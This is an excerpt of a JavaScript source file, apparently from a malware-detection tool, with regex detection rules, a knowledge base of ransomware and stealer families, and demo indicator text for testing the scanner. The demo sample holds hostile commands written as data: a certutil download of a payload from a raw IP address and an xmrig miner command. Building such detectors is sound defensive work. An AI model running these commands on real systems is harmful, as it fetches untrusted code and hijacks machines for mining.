...
export const YARA_RULES = [
  { name: 'CobaltStrike_Stager', rx: /(4d5a9000|msf|beacon|ReflectiveDll|pipe.*MSSE|checksum8)/i, desc: 'CobaltStrike stager/beacon artifacts — most-used C2 framework in enterprise compromises' },
  ...
  { name: 'Tor_C2_Infrastructure', rx: /(\.onion|torrc|socks5.*9050|TorBrowser)/i, desc: 'Tor hidden service C2 — used by Qilin, LockBit, and APT groups for resilient comms' },
...
export const DEMO_SAMPLE = [
  ...
  'Example IOC hashes (safe placeholders, NOT real malware):',
  ...
  'certutil -urlcache -split -f http://185.220.101.45/payload.bin "C:\\Windows\\Temp\\p.bin"',
  ...
  '',
  '# Tor C2 + cryptominer',
  'socks5 127.0.0.1:9050  abcdefghij234567.onion',
  'xmrig -o stratum+tcp://pool.minexmr.com:443 -u 4xMoneroWalletExample',
  '',
  '# Ransom note + payment + exploit reference',
  'README_DECRYPT.txt : your files are .locked — pay bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
...
export const KB_DATA = [
  { name: 'Qilin (Agenda)', type: 'ransomware', active: true, desc: 'High-volume ransomware group. Rust-based cross-platform variant (Qilin.B) with intermittent encryption. Targets healthcare, manufacturing, MSPs. GPO-deployed credential harvesting. RaaS model.', chips: ['Rust/Go', 'Cross-platform', 'RaaS'] },
  { name: 'LockBit 5.0', type: 'ransomware', active: true, desc: 'Resurgent RaaS after Operation Cronos disruption. Cross-platform variant targeting Windows, Linux, VMware ESXi. Russian-speaking criminal group with resilient infrastructure.', chips: ['v5.0', 'Cross-platform', 'RaaS'] },
  { name: 'Akira', type: 'ransomware', active: true, desc: 'Consistent top-tier ransomware group. Retro terminal-themed leak site. Uses compromised VPN credentials (Cisco ASA) for initial access. Double extortion. Rust variant available.', chips: ['VPN access', 'Double extortion', 'SMB focus'] },
  { name: 'LummaC2 (Lumma Stealer)', type: 'infostealer', active: true, desc: 'Leading infostealer. Harvests browser passwords, crypto wallets, 2FA codes, session cookies. MaaS model sold on Russian forums. Recovered quickly after coordinated takedown attempts.', chips: ['MaaS', 'Browser creds', 'Session hijack'] },
  ...
  { name: 'PlugX (Korplug)', type: 'rat', active: true, desc: 'Chinese APT-linked modular backdoor — APT10, APT41, Mustang Panda. DLL sideloading delivery. Long-term persistence favorite.', chips: ['APT10/41', 'DLL sideload', 'Nation-state'] },
  ...
  { name: 'WhisperGate', type: 'wiper', active: true, desc: 'Wiper masquerading as ransomware — no decryption key ever provided. MBR overwrite. Attributed to Russian GRU-linked Sandworm/UAC-0082.', chips: ['GRU', 'MBR wipe', 'Fake ransomware'] },
